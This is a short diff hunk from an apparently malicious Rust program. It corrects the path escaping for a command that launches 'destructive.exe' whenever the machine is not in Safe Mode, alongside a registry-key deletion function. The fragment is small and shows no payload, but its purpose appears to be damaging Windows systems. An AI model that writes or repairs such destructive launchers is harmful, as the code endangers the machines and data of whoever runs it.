@@ -57,7 +57,7 @@ fn delete_registry_key(key_path: &str, value_name: Option<&str>) {
 // Main function
 fn main() {
     // Run destructive.exe at the start if Safe Mode is not enabled
-    let destructive_command = r#"\"C:\\Program Files\\utkudrk2\\destructive.exe\""#;
+    let destructive_command = r#"\"C:\Program Files\utkudrk2\destructive.exe\""#;
     
     if !is_safe_mode() {
         // If not in Safe Mode, run destructive.exe and exit
